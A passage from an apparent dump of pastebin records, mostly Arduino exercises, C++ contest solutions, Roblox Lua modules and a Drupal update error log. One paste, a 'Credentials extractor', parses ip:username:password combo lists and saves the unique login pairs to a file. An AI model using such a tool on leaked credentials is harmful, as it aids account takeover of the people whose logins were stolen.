+        int task_period = getTaskPeriod(blink_LED_task_id);
+        Serial.println(task_period);
+        BTN_old_state = digitalRead(BTN);
+    }else if(BTN_old_state > digitalRead(BTN)){
+        setTaskPeriod(blink_LED_task_id, 1000 / br / 2);
+        BTN_old_state = digitalRead(BTN);
+    }
+}
+
+void SW_attachInterrupt(short mode, interruptFunction func){
+    if(mode == RISING){
+        sw_rising_edge_func  = func;
+    }else if(mode == FALLING){
+        sw_falling_edge_func = func;
+    }
+}
+
+void SW_intrptFuncs(){
+    if(br + 1 > 10){
+        br = 1;
+    }else{
+        ++br;
+    }
+}
+
+void SW_check(int id, void* ptrt){
+    if(SW_old_state < digitalRead(SW)){
+        sw_rising_edge_func();
+        SW_old_state = digitalRead(SW);
+    }else if(SW_old_state > digitalRead(SW)){
+        sw_falling_edge_func();
+        SW_old_state = digitalRead(SW);
+    }
+}
+
+void SerialHandler(int id, void* ptrt){
+    if(Serial.available()){
+        char tmp = Serial.read();
+        if(tmp >= '0' && tmp <= '9'){
+            br = tmp - '0' + 1;
+            setTaskPeriod(blink_LED_task_id, 1000 / br / 2);
+        }
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    pinMode(LED, OUTPUT);
+    BTN_old_state = digitalRead(BTN);
+    SW_old_state  = digitalRead(SW);
+    SW_attachInterrupt(RISING, SW_intrptFuncs);
+    SW_attachInterrupt(FALLING, SW_intrptFuncs);
+    blink_LED_task_id = createTask(blink_LED_task, 500, TASK_ENABLE, NULL);
+    createTask(BTN_check, 50, TASK_ENABLE, NULL);
+    createTask(SW_check, 50, TASK_ENABLE, NULL);
+    createTask(SerialHandler, 500, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+LnR5Rvtz,[НРС] Вежбе 16 - Задатак 5,MartinSRB,C++,Sunday 14th of May 2023 05:34:21 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+void serial_check(int id, void* ptrt){
+    static int broj1 = -9548, broj2; //lupio sam neku rendom vrednost
+    if(Serial.available()){
+        if(broj1 != -9548){
+            broj2 = atoi(Serial.readString());
+            Serial.println(broj1 + broj2);
+            Serial.println(""Sabiranje zavrseno... Ceka se unos prvog broja: "");
+            broj1 = -9548;
+        }else if(broj1 == -9548){
+            broj1 = atoi(Serial.readString());
+            Serial.println(""Ceka se unos drugog broja: "");
+        }
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    Serial.println(""Ceka se unos prvog broja: "");
+    createTask(serial_check, 100, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+NZzgjTir,[НРС] Вежбе 16 - Задатак 4,MartinSRB,C++,Sunday 14th of May 2023 05:33:59 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+const int pin_array[] = {2, 7, 8, 35}; //u zadatku greskom pise 25, treba 35
+
+void serial_check(int id, void* ptrt){
+    int dec = 0;
+    for(int i = 0; i < 4; ++i){ //znamo da ide do 4 jer proveravamo clanove 'pin_array'
+        dec += digitalRead(pin_array[i]) * pow(2, i);
+    }
+    Serial.println(dec);
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    createTask(serial_check, 1000, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+agQkzATB,[НРС] Вежбе 16 - Задатак 3,MartinSRB,C++,Sunday 14th of May 2023 05:33:20 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+void serial_check(int id, void* ptrt){
+    if(Serial.available()){ //koristim if jer uzimam ceo red, tj. cim je nesto dostupno ja uzimam SVE
+        char *s = Serial.readString();
+        Serial.writeln(s);
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    createTask(serial_check, 100, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+9FK5baQt,[НРС] Вежбе 16 - Задатак 2,MartinSRB,C++,Sunday 14th of May 2023 05:32:42 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+void turn_off_all_LED(){
+    for(int i = 26; i <= 29; ++i){
+        digitalWrite(i, LOW);
+    }
+}
+
+void serial_check(int id, void* ptrt){
+    if(Serial.available()){ //Ovde koristim if jer ce uvek za jednu binarnu konverziju da koristi jednu cifru -> [0-9]
+        char dec_char = Serial.read();
+        if(dec_char >= '0' && dec_char <= '9'){
+            turn_off_all_LED(); //cistimo prethodni ispis za binarni broj (samo ako je uneta cifra ovo radim).
+            int dec = dec_char - '0',
+                i   = 26;
+            while(dec / 2 > 0 || i <= 29){
+                digitalWrite(i++, dec % 2);
+                dec /= 2;
+            }
+        }
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    for(int i = 26; i <= 29; ++i){
+        pinMode(i, OUTPUT);
+    }
+    createTask(serial_check, 100, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+XdrQdhRe,[НРС] Вежбе 16 - Задатак 1,MartinSRB,C++,Sunday 14th of May 2023 05:32:18 PM CDT,"#include<arduinoPlatform.h>
+#include<tasks.h>
+#include<interrupts.h>
+#include<stdio.h>
+#include<serial.h>
+#include <pwm.h>
+#include<data.h>
+
+extern serial Serial;
+
+void serial_check(int id, void* ptrt){
+    bool newLine = false; //koristim da vidim jel mi treba novi red, tj. da li je doslo do nekog ispisa na Serial
+    while(Serial.available()){ //koristim while da bih u jednom izvrsenju taska uzeo sve karaktere ali karakter po karakter [...]
+    // [...] ako bi se koristio if onda bi svakim pozivom taska ispisao jedan karakter, a ovako ce u jednom pozivu sve a [...]
+    // [...] pritom ne menjajuci uslov zadatka
+        char character = Serial.read();
+        Serial.write(character);
+        newLine = true;
+    }
+    if(newLine){
+        Serial.println(""""); //samo novi red zelim
+    }
+}
+
+void setup()
+{
+    Serial.begin(9600);
+    createTask(serial_check, 100, TASK_ENABLE, NULL);
+}
+
+void loop()
+{
+
+}
+"
+DLijg41Z,# tk_infinite_cavern.py,here2share,Python,Sunday 14th of May 2023 05:26:45 PM CDT,"# tk_infinite_cavern.py
+
+import tkinter as tk
+from PIL import ImageGrab
+import math
+import random
+
+ww = 600
+hh = 600
+
+root = tk.Tk()
+root.geometry(""%dx%d+0+0""%(ww,hh))
+canvas = tk.Canvas(root, bg='white', width=ww, height=hh)
+canvas.pack()
+
+cx, cy = ww//2, hh//2
+
+radius = 1.5
+
+rgb = [i for i in range(0, 256, 5)]
+colors = ['#{:02x}{:02x}{:02x}'.format(r,g,b) for r in rgb for g in rgb for b in rgb][40:-40]
+random.shuffle(colors)
+
+number_of_points = 12
+morph_steps = 400
+
+# Generate the RGB values for each color
+def rgb(x, y):
+	r, g, b = img.getpixel((x, y))
+	r = min(255, max(0, r + random.randint(-rnd, rnd)))
+	g = min(255, max(0, g + random.randint(-rnd, rnd)))
+	b = min(255, max(0, b + random.randint(-rnd, rnd)))
+	color = '#{:02x}{:02x}{:02x}'.format(r,g,b)
+	canvas.create_oval(x, y, x + 1, y + 1, fill=color, outline='')
+
+def blob():
+	center_x, center_y = cx, cy
+	for j in range(number_of_points):
+		angle = 2 * math.pi * j / number_of_points
+		r = radius * random.uniform(0.2, 1)
+		a = angle * random.uniform(0.95, 1)
+		x = center_x + r * math.cos(a)
+		y = center_y + r * math.sin(a)
+		points.append((x, y))
+
+# Zoom into the center of the screen
+i = 0
+scale = 1.02
+while True:
+	# img = ImageGrab.grab()
+	canvas.scale('all', cx, cy, scale, scale)
+	if not int(i) % 80:
+		points = []
+		blob()
+		color = colors.pop(0)
+		canvas.create_polygon(points, smooth=True, fill=color, outline='')
+		colors.insert(10-int(i%10), color)
+	i += scale
+	i %= 999999999
+	canvas.update()
+	"
+LRjYZdmW,[PYTHON] Credentials extractor,nullnullnullnullnull,Python,Sunday 14th of May 2023 04:26:43 PM CDT,"# shitty credentials extractor i wrote
+# usage: fill ""file.txt"" with the shit ya want to extract, run script, enter format and press enter
+# your shit will be dumped in ""creds.txt""
+
+print(""1 - ip:username:password"")
+print(""2 - ip username:password"")
+print(""3 - ip:port username:password"")
+print(""4 - ip:port:username:password"")
+print(""5 - username:password:ip:port"")
+print(""6 - username:password:ip"")
+print(""7 - username:password ip"")
+print(""8 - username:password"")
+print(""9 - username password"")
+try:
+    _format = input(""\nFormat: "")
+except:
+    _format = ""8""
+
+creds_uniq = []
+creds_total = []
+with open(""file.txt"") as fd:
+    for line in fd:
+
+        line = line.rstrip()
+        if len(line) < 1 or line.startswith(""#"") or line.startswith(""DUP""):
+            continue
+
+        ip = port = username = password = ""???""
+        try:
+            match _format:
+                case ""1"":
+                    ip, username, password = line.split("":"")
+                
+                case ""2"":
+                    ip, combo = line.split("" "")
+                    username, password = combo.split("":"")
+                
+                case ""3"":
+                    addr, combo = line.split("" "")
+                    ip, port = addr.split("":"")
+                    username, password = combo.split("":"")
+                
+                case ""4"":
+                    ip, port, username, password = line.split("":"")
+                
+                case ""5"":
+                    username, password, ip, port = line.split("":"")
+                
+                case ""6"":
+                    username, password, ip = line.split("":"")
+                
+                case ""7"":
+                    combo, ip = line.split("" "")
+                    username, password = combo.split("":"")
+                
+                case ""8"":
+                    username, password = line.split("":"")
+                
+                case ""9"":
+                    username, password = line.split("" "")
+
+        except Exception:
+            print(f""Couldn't parse '{line}'"")
+            continue
+
+        if len(username) == 0 or username == "" "":
+            username = ""n/a""
+        
+        if len(password) == 0 or password == "" "":
+            password = ""n/a""
+
+        combo = f""{username}:{password}""
+        print(f""[{ip}] --> {combo}"")
+
+        if not combo in creds_uniq:
+            creds_uniq.append(combo)
+        
+        creds_total.append(combo)
+
+print(f""\nTotal: {len(creds_total)}"")
+print(f""Unique: {len(creds_uniq)}"")
+print(f""Difference: {len(creds_total) - len(creds_uniq)}"")
+
+with open(""creds.txt"", ""w+"") as fd:
+    fd.write(""\n"".join(creds_uniq))"
+w4xpED53,Untitled,Falexom,Python,Sunday 14th of May 2023 04:24:38 PM CDT,"import psycopg2
+
+data = input()
+
+conn = psycopg2.connect(database='postgres', user='postgres', host='localhost', port=5432)  # подключаемся к СУБД
+cursor = conn.cursor()
+cursor.execute(""SELECT * FROM python WHERE id=%(int)s;"", {'int': data})
+output = cursor.fetchone()
+conn.commit()
+print(output)
+"
+E4y1s78u,Current game version,Froyo1002YT,Lua,Sunday 14th of May 2023 04:12:21 PM CDT,"current version.
+144"
+5bW2FnXe,Untitled,Salvens,C++,Sunday 14th of May 2023 04:00:09 PM CDT,"#include <algorithm>
+#include <iostream>
+#include <iomanip>
+#include <cmath>
+#include <vector>
+#include <set>
+#include <map>
+#include <string>
+#include <cassert>
+#include <numeric>
+#include <queue>
+using namespace std;
+
+//#define int long long
+#define IOS ios::sync_with_stdio(false); cin.tie(0); cout.tie(0);
+
+const long long INF = 1e9 + 7;
+const double EPS = 1e-9;
+const int N = 1e5 + 1000;
+const int MOD = 1e9 + 7;
+
+int n, a, b, c;
+vector<int> v;
+string s = """";
+
+void rec(int pos) {
+//    cout << s << ' ' << c << ' ' << pos << endl;
+    if (s.size() == n) {
+        cout << s << '\n';
+        exit(0);
+    }
+
+//    cout << c + v[pos] << ' ';
+    if (c + v[pos] >= a && c + v[pos] <= b) {
+        c += v[pos];
+        s += '1';
+        rec(pos + 1);
+        c -= v[pos];
+        s.pop_back();
+
+    }
+
+    if (c - v[pos] >= a && c - v[pos] <= b) {
+        c -= v[pos];
+        s += '0';
+        rec(pos + 1);
+        c += v[pos];
+        s.pop_back();
+    }
+}
+
+void solve() {
+    cin >> n >> a >> b;
+    for (int i = 0; i < n; ++i) {
+        int x;
+        cin >> x;
+        v.emplace_back(x);
+    }
+    rec(0);
+    cout << ""Impossible\n"";
+}
+
+int32_t main() {
+    IOS;
+
+    int tt = 1;
+//    cin >> t;
+    while (tt--) {
+        solve();
+    }
+    return 0;
+}
+
+/*
+1.  数组开够了没
+2.  文件名写对了没，文件夹建了吗
+3.  内存会不会MLE
+4.  多测清空？
+5.  调试删干净了没
+6.  取模有没有溢出
+7.  快速幂底数要取模，幂对 mod-1 取模
+8.  前向星和欧拉序要开2倍数组
+9.  比较函数如果值相同的话有没有第二优先级
+10. 线段树 4 倍空间，线段树合并和可持久化线段树 32 倍空间
+11. 看清楚 log 的底数是啥，log后面的数是啥
+12. long long 只有正负 2^63-1
+*/
+
+"
+RdaAW2Vs,drupal10-update-error,triple5,Bash,Sunday 14th of May 2023 03:52:06 PM CDT,"Loading composer repositories with package information
+Updating dependencies
+Your requirements could not be resolved to an installable set of packages.
+
+  Problem 1
+    - Root composer.json requires drupal/core 10.0.0, found drupal/core[10.0.0] but these were not loaded, likely because it conflicts with another require.
+  Problem 2
+    - drupal/admin_toolbar is locked to version 3.4.0 and an update of this package was not requested.
+    - drupal/admin_toolbar 3.4.0 requires drupal/core ^9.2 || ^10 -> found drupal/core[9.2.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 3
+    - drupal/captcha is locked to version 1.10.0 and an update of this package was not requested.
+    - drupal/captcha 1.10.0 requires drupal/core ^8.9 || ^9 -> found drupal/core[8.9.0-beta1, ..., 8.9.x-dev, 9.0.0-alpha1, ..., 9.5.x-dev] but it conflicts with your root composer.json require (10.0.0).
+  Problem 4
+    - drupal/core-recommended is locked to version 9.5.9 and an update of this package was not requested.
+    - drupal/core-recommended 9.5.9 requires drupal/core 9.5.9 -> found drupal/core[9.5.9] but it conflicts with your root composer.json require (10.0.0).
+  Problem 5
+    - drupal/csp is locked to version 1.19.0 and an update of this package was not requested.
+    - drupal/csp 1.19.0 requires drupal/core ^9.5 || ^10 -> found drupal/core[9.5.0-beta1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 6
+    - drupal/ctools is locked to version 3.13.0 and an update of this package was not requested.
+    - drupal/ctools 3.13.0 requires drupal/core ^9.3 || ^10 -> found drupal/core[9.3.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 7
+    - drupal/entity_print is locked to version 2.11.0 and an update of this package was not requested.
+    - drupal/entity_print 2.11.0 requires drupal/core ^9.4 || ^10.0 -> found drupal/core[9.4.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 8
+    - drupal/honeypot is locked to version 2.1.2 and an update of this package was not requested.
+    - drupal/honeypot 2.1.2 requires drupal/core ^9.2 || ^10 -> found drupal/core[9.2.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 9
+    - drupal/noreferrer is locked to version 1.16.0 and an update of this package was not requested.
+    - drupal/noreferrer 1.16.0 requires drupal/core ^8.7.7 || ^9 || ^10 -> found drupal/core[8.7.7, ..., 8.9.x-dev, 9.0.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 10
+    - drupal/pathauto is locked to version 1.11.0 and an update of this package was not requested.
+    - drupal/pathauto 1.11.0 requires drupal/core ^9.3 || ^10 -> found drupal/core[9.3.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 11
+    - drupal/seckit is locked to version 2.0.1 and an update of this package was not requested.
+    - drupal/seckit 2.0.1 requires drupal/core ^9.3 || ^10 -> found drupal/core[9.3.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 12
+    - drupal/stable is locked to version 2.0.0 and an update of this package was not requested.
+    - drupal/stable 2.0.0 requires drupal/core ^9 || ^10 -> found drupal/core[9.0.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 13
+    - drupal/token is locked to version 1.11.0 and an update of this package was not requested.
+    - drupal/token 1.11.0 requires drupal/core ^9.2 || ^10 -> found drupal/core[9.2.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev] but these were not loaded, likely because it conflicts with another require.
+  Problem 14
+    - drupal/webform is locked to version 6.1.4 and an update of this package was not requested.
+    - drupal/webform 6.1.4 requires drupal/core ^8.8 || ^9 -> found drupal/core[8.8.0-alpha1, ..., 8.9.x-dev, 9.0.0-alpha1, ..., 9.5.x-dev] but it conflicts with your root composer.json require (10.0.0).
+  Problem 15
+    - drupal/footnotes dev-2.x requires drupal/core >=8.6 -> found drupal/core[8.6.0-alpha1, ..., 8.9.x-dev, 9.0.0-alpha1, ..., 9.5.x-dev, 10.0.0-alpha1, ..., 10.1.x-dev, 11.x-dev] but these were not loaded, likely because it conflicts with another require.
+    - drupal/footnotes 2.x-dev is an alias of drupal/footnotes dev-2.x and thus requires it to be installed too.
+    - Root composer.json requires drupal/footnotes ^2.1 -> satisfiable by drupal/footnotes[2.x-dev (alias of dev-2.x)].
+
+
+Installation failed, reverting ./composer.json and ./composer.lock to their original content.
+"
+ESfzXbCU,Untitled,shtirmann,C++,Sunday 14th of May 2023 03:39:40 PM CDT,"#include <bits/stdc++.h>
+
+using namespace std;
+typedef long long ll;
+#define int long long
+const long long INF = LONG_LONG_MAX;
+
+map<int, vector<int>> graph;
+vector<int> needed;
+vector<int> dp;
+set<int> fucking_set;
+
+int rebro_amo(int my_ver, int parent) {
+  for (auto i : graph[my_ver]) {
+    if (i == parent) continue;
+    dp[my_ver] += rebro_amo(i, my_ver);
+  }
+  if (fucking_set.find(my_ver) != fucking_set.end() || dp[my_ver]) {
+    return dp[my_ver] + 1;
+  }
+  return 0;
+}
+
+signed main() {
+  int n, m;
+  cin >> n >> m;
+  dp.resize(n + 1, 0);
+  for (int i = 0; i < n - 1; ++i) {
+    int a, b;
+    cin >> a >> b;
+    graph[a].push_back(b);
+    graph[b].push_back(a);
+  }
+  for (int i = 0; i < m; ++i) {
+    int a;
+    cin >> a;
+    needed.push_back(a);
+    fucking_set.insert(a);
+  }
+  if (m == 1) {
+    cout << needed[0] << '\n' << 0;
+    return 0;
+  }
+  int a = needed[0];
+  queue<int> q;
+  q.push(a);
+  map<int, bool> used;
+  vector<int> d(n + 1, 0);
+  used[a] = true;
+  while (!q.empty()) {
+    int v = q.front();
+    q.pop();
+    for (int i = 0; i < graph[v].size(); ++i) {
+      int to = graph[v][i];
+      if (!used[to]) {
+        used[to] = true;
+        q.push(to);
+        d[to] = d[v] + 1;
+      }
+    }
+  }
+  //for (auto i : d) {
+  //  cout << i << ' ';
+  //}
+  //cout << '\n';
+  int maxindex = 0;
+  int maxvalue = 0;
+  for (auto i : needed) {
+    if (d[i] > maxvalue) {
+      maxvalue = d[i];
+      maxindex = i;
+    } else if (d[i] == maxvalue) {
+      maxindex = min(maxindex, i);
+    }
+  }
+  a = maxindex;
+  queue<int> q1;
+  q1.push(a);
+  map<int, bool> used1;
+  vector<int> d1(n + 1, 0);
+  used1[a] = true;
+  while (!q1.empty()) {
+    int v = q1.front();
+    q1.pop();
+    for (int i = 0; i < graph[v].size(); ++i) {
+      int to = graph[v][i];
+      if (!used1[to]) {
+        used1[to] = true;
+        q1.push(to);
+        d1[to] = d1[v] + 1;
+      }
+    }
+  }
+  int maxindex1 = 0;
+  int maxvalue1 = 0;
+  for (auto i : needed) {
+    if (d1[i] > maxvalue1) {
+      maxvalue1 = d1[i];
+      maxindex1 = i;
+    } else if (d1[i] == maxvalue1) {
+      maxindex1 = min(maxindex1, i);
+    }
+  }
+  int amount = rebro_amo(maxindex, -1) - 1;
+  cout << min(maxindex, maxindex1) << '\n';
+  cout << amount * 2 - maxvalue1;
+  return 0;
+}
+"
+XviTSEcH,Camera.lua,CarpalEnderman,Lua,Sunday 14th of May 2023 03:37:59 PM CDT,"--[[ Services ]]
+
+local UIS = game:GetService('UserInputService')
+local RunService = game:GetService('RunService')
+local StarterGui = game:GetService('StarterGui')
+local Settings = UserSettings():GetService('UserGameSettings')
+
+--[[ Modules ]]
+
+local ClientModules = script.Parent:WaitForChild('ClientModules')
+local ClientConfig = require(ClientModules.ClientConfig)
+
+--[[ Consts and Globals ]]
+
+local LocalPlayer = game:GetService('Players').LocalPlayer
+local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+local CameraConfig = ClientConfig.Camera
+
+local Camera = workspace.CurrentCamera
+local CameraMode = CameraConfig.Mode.Free
+local CameraRotating = false
+
+-- Free Camera vars
+local FreeMoveVector = Vector3.new()
+local FreeMoveSpeed = CameraConfig.FreeMoveSpeed
+
+-- Orbit Camera vars
+local OrbitDistance = 0
+local OrbitFocus = nil
+
+--[[ Setup ]]
+
+-- Config the camera
+Camera.CameraType = Enum.CameraType.Scriptable
+Camera:GetPropertyChangedSignal('CameraType'):Once(function()
+    Camera.CameraType = Enum.CameraType.Scriptable
+end)
+Camera.CFrame = CameraConfig.StartCFrame
+
+--[[ Functions ]]
+
+--[[
+@returns
+The camera rotation since the last frame.
+]]
+local function GetCameraRotation(): Vector2
+    if CameraRotating then
+        return -UIS:GetMouseDelta() * CameraConfig.RotationSpeed * Settings.MouseSensitivity
+    else
+        return Vector2.new()
+    end
+end
+
+--[[
+Rotates the user's camera depending on the camera mode.
+]]
+local function MoveCamera(dt: number)
+    local rotation = GetCameraRotation()
+    
+    if CameraMode == CameraConfig.Mode.Free then
+        local cameraCFrame = Camera.CFrame:ToWorldSpace(CFrame.new(FreeMoveVector * FreeMoveSpeed * dt)) -- move camera
+        Camera.CFrame = cameraCFrame * CFrame.Angles(0, rotation.X, 0) * CFrame.Angles(rotation.Y, 0, 0) -- rotate camera
+        
+    elseif CameraMode == CameraConfig.Mode.Orbit then
+        local rotatedCam = Camera.CFrame * CFrame.Angles(0, rotation.X, 0) * CFrame.Angles(rotation.Y,0,0) -- rotate camera
+        local cameraCFrame = CFrame.new(OrbitFocus.CFrame.Position) * CFrame.fromEulerAnglesXYZ(rotatedCam:ToEulerAnglesXYZ()) -- move camera to the focused planet pos
+        Camera.CFrame = cameraCFrame:ToWorldSpace(CFrame.new(0,0,OrbitDistance)) -- add the distance between the planet and the camera (moves the camera zoomDist studs behind itself)
+    end
+    
+    Character.Head.CFrame = Camera.CFrame
+end
+
+--[[ Main ]]
+
+-- Disable unnecessary UI
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Health,     false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack,   false)
+StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
+
+-- Camera movement
+RunService:BindToRenderStep('Camera', Enum.RenderPriority.Camera.Value - 1, MoveCamera)
+
+-- Handle keyboard inputs
+UIS.InputBegan:Connect(function(input: InputObject, gameProcessed: boolean)
+    if not gameProcessed then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            local key = input.KeyCode
+
+            -- add movement vector for each key held to the total vector for camera movement
+            if CameraConfig.KeybindToDirection[key] then
+                FreeMoveVector += CameraConfig.KeybindToDirection[key]
+
+            -- unfocus
+            elseif key == CameraConfig.Keybinds.Unfocus then 
+                CameraMode = CameraConfig.Mode.Free
+            end
+        end
+    end
+
+    -- send signal to rotate camera
+    -- FYI: camera rotation ignores `gameProcessed` because if you try to rotate the camera while your cursor is above a body's label,
+    --      it would not rotate and i cant be bothered (yet TODO) to find a way to avoid those specific interactions
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        CameraRotating = true
+        UIS.MouseBehavior = Enum.MouseBehavior.LockCurrentPosition
+    end
+end)
+
+
+UIS.InputChanged:Connect(function(input: InputObject, gameProcessed: boolean)
+    if input.UserInputType == Enum.UserInputType.MouseWheel then
+        local direction = input.Position.Z
+        if OrbitFocus then
+            local r = OrbitFocus.Size.X/2
+            OrbitDistance += -direction * OrbitDistance * CameraConfig.OrbitZoomMultiplier -- zoomDist * RepConfig.zoomSpeed speeds up the zoom as u get farther from subject and slower as u get closer.
+            OrbitDistance = math.clamp(OrbitDistance, r * CameraConfig.OrbitRelativeMinZoom, r * CameraConfig.OrbitRelativeMaxZoom)
+        end
+    end
+end)
+
+
+UIS.InputEnded:Connect(function(input: InputObject, gameProcessed: boolean)
+    if not gameProcessed then
+        if input.UserInputType == Enum.UserInputType.Keyboard then
+            local key = input.KeyCode
+
+            -- remove movement vector once unheld
+            if CameraConfig.KeybindToDirection[key] then
+                FreeMoveVector -= CameraConfig.KeybindToDirection[key]
+            end
+        end
+    end
+
+    if input.UserInputType == Enum.UserInputType.MouseButton2 then
+        CameraRotating = false
+        UIS.MouseBehavior = Enum.MouseBehavior.Default
+    end
+end)"
+1LzJZdQV,Body.lua,CarpalEnderman,Lua,Sunday 14th of May 2023 03:36:59 PM CDT,"--[[ Services ]]
+
+local RepStore = game:GetService('ReplicatedStorage')
+local RS = game:GetService('RunService')
+
+--[[ Events ]]
+
+local SharedEvents = RepStore:WaitForChild('SharedEvents')
+local OnBodyRegistered = SharedEvents:WaitForChild('OnBodyRegistered')
+
+--[[ Module ]]
+
+local Body = {}
+
+-- consts
+local G = 6.6743e-11
+local PI = math.pi
+
+-- vars
+local SharedPrefabs = RepStore:WaitForChild('SharedPrefabs')
+local BodyPrefab = SharedPrefabs:WaitForChild('Body')
+    
+-- types
+export type Body = {
+    Name: string,
+    Color3: Color3,
+    Mu: number, -- Standard Gravitational Parameter
+    Radius: number,
+    Position: Vector3,
+    Velocity: Vector3,
+    Acceleration: Vector3
+}
+
+export type BodySyncData = Vector3
+
+export type BodyReplicationData = {
+    Name: string,
+    Color3: Color3,
+    Radius: number,
+    Position: Vector3
+}
+
+export type NewBodyParams = {
+    Name: string,
+    Color3: Color3,
+    Position: Vector3?, -- default: (0,0,0)
+    Velocity: Vector3?, -- default: (0,0,0)
+
+    -- Need at least 2 of the following: Density, Radius, Mass/Mu
+    Density: number?,
+    Radius: number?,
+    Mass: number?, 
+    Mu: number?
+}
+
+--[[
+A constructor for bodies.
+
+@returns
+A new body, created from the parameters.
+]]
+function Body.new(params: NewBodyParams): Body
+    local radius
+    local mu
+    
+    if params.Radius then
+        radius = params.Radius
+        if params.Mu then
+            mu = params.Mu
+        elseif params.Mass then
+            mu = G * params.Mass
+        end
+    elseif params.Density then
+        if params.Radius then
+            radius = params.Radius
+            mu = (4/3) * PI * G * params.Density * radius^3
+        elseif params.Mass then
+            radius = .75 * (params.Mass / (PI * params.Density))^(1/3)
+            mu = params.Mass * G
+        elseif params.Mu then
+            mu = params.Mu
+            radius = .75 * (mu / (PI * G * params.Density))^(1/3)
+        end
+    end
+    
+    return {
+        Name = params.Name,
+        Color3 = params.Color3,
+        Mu = mu,
+        Radius = radius,
+        Position = params.Position or Vector3.new(),
+        Velocity = params.Velocity or Vector3.new(),
+        Acceleration = Vector3.new()
+    }
+end
+
+--[[
+Registers a body onto the server and sends all clients the registered body.
+
+@params
+bodies      The body table.
+body        The body to register.
+]]
+function Body.Register(bodies: { Body }, body: Body)
+    table.insert(bodies, body)
+    OnBodyRegistered:FireAllClients(body)
+end
+
+-- Alias for Body.Register(bodies, Body.new(params))
+function Body.RegisterNew(bodies: { Body }, params: BodyParams)
+    Body.Register(bodies, Body.new(params))
+end
+
+--[[
+Formats a body into the data to be sent to sync it on the client.
+
+@returns
+A list of positions of each body.
+]]
+function Body.ToSyncData(body: Body): BodySyncData
+    return body.Position
+end
+
+--[[
+Formats a body into only the key things need to replicate it on the client.
+
+@returns
+Visual data for the body, such as its position, colour, etc.
+]]
+function Body.ToReplicationData(body: Body): BodyReplicationData
+    return {
+        Name = body.Name,
+        Color3 = body.Color3,
+        Radius = body.Radius,
+        Position = body.Position
+    }
+end
+
+--[[
+Creates a body on the client
+
+@returns
+The body model
+]]
+function Body.Replicate(parent: Instance, id: number, repData: BodyReplicationData)
+    local d = repData.Radius * 2
+    
+    local bodyPart = BodyPrefab:Clone()
+    bodyPart.Name = tostring(id)
+    bodyPart.Color = repData.Color3
+    bodyPart.Size = Vector3.new(d,d,d)
+    bodyPart.Position = repData.Position
+    bodyPart.NameGui.TextLabel.Text = repData.Name
+    bodyPart.Parent = parent
+end
+
+return Body
+"
+kngaztLf,Simulation.lua,CarpalEnderman,Lua,Sunday 14th of May 2023 03:36:14 PM CDT,"
+--[[ Services ]]
+
+local RepStore = game:GetService('ReplicatedStorage')
+local RS = game:GetService('RunService')
+
+--[[ Modules ]]
+
+local SharedModules = RepStore:WaitForChild('SharedModules')
+local SharedConfig = require(SharedModules:WaitForChild('SharedConfig'))
+local RunUtils = require(SharedModules:WaitForChild('RunUtils'))
+local TableUtils = require(SharedModules:WaitForChild('TableUtils'))
+local Body = require(SharedModules:WaitForChild('Body'))
+
+--[[ Events ]]
+
+local SharedEvents = RepStore:WaitForChild('SharedEvents')
+
+local RequestNewBody = SharedEvents:WaitForChild('RequestNewBody')
+local GetAllBodyReplicationData = SharedEvents:WaitForChild('GetAllBodyReplicationData')
+local GetBodyData = SharedEvents:WaitForChild('GetBodyData')
+local OnBodyRegistered = SharedEvents:WaitForChild('OnBodyRegistered')
+local OnBodySync = SharedEvents:WaitForChild('OnBodySync')
+
+--[[ Variables ]]
